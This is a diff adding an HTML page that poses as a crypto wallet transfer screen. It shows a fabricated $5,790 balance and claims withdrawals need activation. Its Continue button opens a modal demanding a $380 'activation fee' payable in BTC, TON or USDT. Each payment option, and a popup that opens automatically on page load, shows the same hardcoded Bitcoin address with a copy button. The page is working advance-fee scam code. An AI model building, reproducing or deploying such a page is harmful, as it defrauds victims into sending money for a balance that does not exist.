@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Transfer</title>
+  <style>
+    /* General Reset */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: Arial, sans-serif;
+  background-color: #0F172A;
+  color: #fff;
+  margin: 20px;
+}
+
+/* Wallet Screen */
+.wallet-screen, .receive-screen {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+  background-color: #0F172A;
+  border-radius: 8px;
+}
+
+.header {
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+.header h1 {
+  font-size: 1.5em;
+  color: #fff;
+}
+
+.verified {
+  color: #36c;
+  font-size: 1.2em;
+}
+
+h2 {
+  margin-bottom: 10px;
+  font-size: 1.2em;
+}
+
+.asset-list {
+  list-style: none;
+  margin-bottom: 20px;
+}
+
+.asset-list li {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 10px;
+  border-bottom: 1px solid #444;
+}
+
+.asset-list li .icon {
+  font-size: 1.5em;
+  margin-right: 10px;
+}
+
+.selected {
+  
+  border-radius: 5px;
+}
+
+.amount {
+  color: #888;
+}
+
+.continue-button {
+  width: 100%;
+  padding: 10px;
+  background-color: #36c;
+  color: #fff;
+  border: none;
+  border-radius: 5px;
+  font-size: 1em;
+  cursor: pointer;
+}
+
+.continue-button:hover {
+  background-color: #258;
+}
+.wallet-back {
+    font-size: 24px; /* Size of the arrow */
+    color: #1DA1F2; /* Blue color */
+    cursor: pointer;
+    margin: 10px; /* Spacing around the arrow */
+    transition: color 0.3s ease; /* Smooth transition effect */
+}
+
+.wallet-back:hover {
+    color: #0d8ddc; /* Darker blue on hover */
+}
+.modal {
+  display: none; /* Hidden by default */
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.8); /* Semi-transparent black */
+  z-index: 1000;
+  justify-content: center;
+  align-items: center;
+}
+
+.modal-content {
+  background-color:#0F172A;
+  color: #fff;
+  padding: 20px;
+  border-radius: 8px;
+  text-align: center;
+  max-width: 400px;
+  width: 90%;
+}
+
+.modal-content h2 {
+  margin-bottom: 10px;
+  font-size: 1.5em;
+}
+
+.modal-content p {
+  margin-bottom: 20px;
+  font-size: 1em;
+}
+
+.payment-options {
+  list-style: none;
+  padding: 0;
+  margin: 20px 0;
+}
+
+.payment-options li {
+  margin: 10px 0;
+}
+
+.pay-button {
+  background-color: #36c;
+  color: #fff;
+  border: none;
+  padding: 10px 20px;
+  border-radius: 5px;
+  cursor: pointer;
+  font-size: 1em;
+}
+
+.pay-button:hover {
+  background-color: #258;
+}
+
+.close-button {
+  background-color: #444;
+  color: #fff;
+  border: none;
+  padding: 10px 20px;
+  border-radius: 5px;
+  cursor: pointer;
+  margin-top: 10px;
+}
+
+.close-button:hover {
+  background-color: #555;
+}
+
+
+  </style>
+</head>
+<body>
+  <!-- Wallet Asset Selection Screen -->
+  <div class="wallet-screen">
+    <div class="header">
+        <span class="wallet-back" onclick="history.back();">&#8592; Back</span> <!-- Back arrow -->
+      <h1>Wallet <span class="verified">✔</span></h1>
+    </div>
+    <h2>Choose asset to send</h2>
+    <ul class="asset-list">
+      <li><span class="icon">$</span> Dollars <span class="amount">$5,790.00 USD</span></li>
+      <li><span class="icon">₿</span> Bitcoin <span class="amount">0.00 BTC</span></li>
+      <li class="selected"><span class="icon">T</span> Toncoin <span class="amount">$0.00 TON</span></li>
+      <li><span class="icon">▲</span> Notcoin <span class="amount">$0.00 NOT</span></li>
+      <li><span class="icon">💵</span> Send to Card <span class="amount">Activate</span></li>
+      <li><span class="icon">🏛</span> Direct to Bank <span class="amount">Activate</span></li>
+      <li><span class="icon">✅</span>Activate your Wallet to be able to Withdraw <span class="amount"></span></li>
+    </ul>
+    <button id="get-started-link" class="continue-button">Continue</button>
+  </div>
+</div>
+    <!-- Activation Fee Modal -->
+    <div id="activation-modal" class="modal">
+      <div class="modal-content">
+        <h2>Wallet Activation Fee</h2>
+        <p>To activate your wallet, a one-time fee of <strong>$380</strong> is required. Choose your preferred payment method:</p>
+        <ul class="payment-options">
+          <ul>
+            <li><button class="pay-button">Pay with Bitcoin (BTC)</button></li>
+            <li><button class="pay-button">Pay with Toncoin (TON)</button></li>
+            <li><button class="pay-button">Pay with USDT</button></li>
+          </ul>
+          
+          <!-- Popup Modal -->
+          <div id="popup" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: black; color: white; padding: 20px; border: 1px solid #ccc; z-index: 1000;">
+            <p id="popup-text" style="margin-bottom: 10px;">
+              Send to BTC <span id="copiable-text" style="font-weight: small;">bc1qxnkxh3umyr2xv5dkk0s8e9wzf9mzernj6t04sl</span>
+            </p>
+            <button onclick="copyToClipboard()" style="margin-right: 10px;">Copy</button>
+            <button onclick="closePopup()">Close</button>
+          </div>
+
+          
+          
+          <!-- Overlay -->
+          <div id="overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 999;" onclick="closePopup()"></div>
+        <button id="close-modal" class="close-button">Close</button>
+      </div>
+    </div>
+  </div>
+  <script>
+// Get modal and elements
+const modal = document.getElementById('activation-modal');
+const getStartedLink = document.getElementById('get-started-link');
+const closeModalButton = document.getElementById('close-modal');
+
+// Show the modal when "Get Started" is clicked
+getStartedLink.addEventListener('click', (event) => {
+  event.preventDefault(); // Prevent default link behavior
+  modal.style.display = 'flex'; // Show modal
+});
+
+// Close the modal when the "Close" button is clicked
+closeModalButton.addEventListener('click', () => {
+  modal.style.display = 'none'; // Hide modal
+});
+
+// Close the modal when clicking outside of the modal content
+window.addEventListener('click', (event) => {
+  if (event.target === modal) {
+    modal.style.display = 'none'; // Hide modal
+  }
+});
+
+
+
+// Function to open the popup
+function openPopup(message) {
+  document.getElementById('copiable-text').textContent = message;
+  document.getElementById('popup').style.display = 'block';
+  document.getElementById('overlay').style.display = 'block';
+}
+
+// Function to close the popup
+function closePopup() {
+  document.getElementById('popup').style.display = 'none';
+  document.getElementById('overlay').style.display = 'none';
+}
+
+// Function to copy text to clipboard
+function copyToClipboard() {
+  const text = document.getElementById('copiable-text').textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    alert("Copied to clipboard!");
+  }).catch(err => {
+    alert("Failed to copy text: " + err);
+  });
+}
+
+// Add event listeners to all buttons
+const buttons = document.querySelectorAll('.pay-button');
+buttons.forEach(button => {
+  button.addEventListener('click', () => {
+    const paymentMethod = button.textContent; // Get button text
+    const address = "bc1qxnkxh3umyr2xv5dkk0s8e9wzf9mzernj6t04sl"; // Example address
+    openPopup(`(${address})`);
+  });
+});
+
+// Function to copy only the 42-character string
+function copyToClipboard() {
+  const textToCopy = document.getElementById('copiable-text').textContent; // Get only the 42-character text
+  navigator.clipboard.writeText(textToCopy).then(() => {
+    alert("Copied to clipboard!");
+  }).catch(err => {
+    alert("Failed to copy text: " + err);
+  });
+}
+
+// Function to open the popup with dynamic content
+function openPopup(address) {
+  document.getElementById('copiable-text').textContent = address; // Set the 42-character text
+  document.getElementById('popup').style.display = 'block';
+  document.getElementById('overlay').style.display = 'block';
+}
+
+// Function to close the popup
+function closePopup() {
+  document.getElementById('popup').style.display = 'none';
+  document.getElementById('overlay').style.display = 'none';
+}
+
+// Example usage (dynamic address):
+document.addEventListener('DOMContentLoaded', () => {
+  openPopup("bc1qxnkxh3umyr2xv5dkk0s8e9wzf9mzernj6t04sl"); // Example 42-character string
+});
+
+
+
+    
+      </script>
+</body>
+</html>
